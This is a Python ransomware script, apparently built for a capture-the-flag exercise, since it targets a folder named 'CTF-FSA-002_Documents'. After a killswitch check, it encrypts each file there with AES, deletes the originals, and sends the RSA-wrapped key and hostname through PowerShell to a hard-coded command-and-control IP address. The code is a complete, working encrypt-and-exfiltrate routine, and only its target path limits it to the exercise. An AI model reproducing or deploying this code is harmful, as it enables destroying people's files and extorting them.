import requests
import sys
import random
import string
import shutil
import socket
import datetime
import os
import subprocess
import json
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
import base64

def killswitch():
    url = ''.join(random.choices(string.ascii_letters + string.digits, k=40)) + ".com"
    try:
        request_random = requests.get(url)
        if request_random.status_code == 200:
            return True
    except requests.exceptions.RequestException:
        pass
    try:
        request_google = requests.get("https://www.google.com")
        if request_google.status_code == 200:
            return False
        else:
            return True
    except requests.exceptions.RequestException:
        return True

def generate_aes_key():
    return get_random_bytes(32)

def list_files_in_fake_env(fake_root):
    if not fake_root.exists():
        return None
    files = []
    for foldername, subfolders, filenames in os.walk(fake_root):
        for filename in filenames:
            file_path = Path(foldername) / filename
            files.append(file_path)
    return files

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(file_data, AES.block_size))
    encrypted_file_path = file_path.with_suffix(file_path.suffix + '.shoubadidou')
    with open(encrypted_file_path, 'wb') as f:
        f.write(cipher.iv)
        f.write(ct_bytes)
    os.remove(file_path)

def encrypt_fake_env_files():
    fake_root = Path.home() / "Documents" / "CTF-FSA-002_Documents"
    if not fake_root.exists():
        return
    aes_key = generate_aes_key()
    send_aes_key_to_c2(aes_key)
    files_to_encrypt = list_files_in_fake_env(fake_root)
    if not files_to_encrypt:
        return
    for file_path in files_to_encrypt:
        encrypt_file(file_path, aes_key)

def send_aes_key_to_c2(key):
    public_key = load_rsa_public_key()
    encrypted_aes_key = encrypt_aes_key_with_rsa(key, public_key)
    c2_url = "http://35.180.193.162:8999"
    hostname = socket.gethostname()
    timestamp = datetime.datetime.now().isoformat()
    payload = {
        "aes_key": encrypted_aes_key.hex(),
        "hostname": hostname,
        "timestamp": timestamp
    }
    json_payload = json.dumps(payload)
    powershell_command = f'''
Invoke-RestMethod -Uri "{c2_url}" -Method Post -Body '{json_payload}' -ContentType "application/json"
'''
    try:
        subprocess.run(
            ["powershell", "-Command", powershell_command],
            capture_output=True,
            text=True,
            timeout=10
        )
    except Exception:
        pass

def load_rsa_public_key():
    b64_key = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnAB7GQ1uawa9iwN0KJjOo4NLfe6eda7MBFb41FY1/siCx0rQ9UYMrmoAl3YHyxY2X1NbJDEkE5U96warIgk6yukTwEsMC9vzsYTgbfIlXkHVBFiB+4XK6cFMo+syxWziqLclWlYRpqWaPiBZAKIuHptXUUT60b5VBZM1cKk6d5E5ASkGBm30iANIhcBG6YjWfn/MdgP4HcHmUrG9NmCaaosXiQxMMcFDBm8ASFSBAfER3jGmNiMYR0mVbBo6wBWAXXOLJiJiRaPPgH/wJ3S8/2SwexNHKWwhZ1FPvZ2E+DtVcSUi1eKBCyl9E0mtq9IjMD1nm+y9f90Lsmrq8h63fwIDAQAB"
    der_key = base64.b64decode(b64_key)
    return RSA.import_key(der_key)

def encrypt_aes_key_with_rsa(aes_key, public_key):
    cipher_rsa = PKCS1_OAEP.new(public_key)
    return cipher_rsa.encrypt(aes_key)

if killswitch():
    sys.exit()
else:
    encrypt_fake_env_files()
